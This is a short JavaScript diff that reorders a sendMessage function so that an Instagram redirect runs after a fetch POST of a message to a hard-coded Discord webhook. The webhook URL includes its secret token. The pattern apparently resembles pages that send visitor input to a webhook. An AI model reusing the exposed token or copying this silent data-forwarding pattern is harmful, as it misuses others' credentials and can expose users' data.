@@ -44,10 +44,6 @@
     
     function sendMessage() {
         
-      document.getElementById("myButton").onclick = function() {
-        location.href = "https://www.instagram.com/w21389123/";
-    };
-}
 
     const whurl = "https://discord.com/api/webhooks/893828775236734996/K7W2ZmdJsVDuAUzl_PNT1rfWCCUWQ_jHPkWrdjQC9Mx0Vj5jkahzNtRjZ9jQ8oxoyNDf"
 
@@ -66,6 +62,11 @@
         },
         "body": JSON.stringify(msg)
     })
+        
+     document.getElementById("myButton").onclick = function() {
+        location.href = "https://www.instagram.com/w21389123/";
+    };
+}
 
 
 
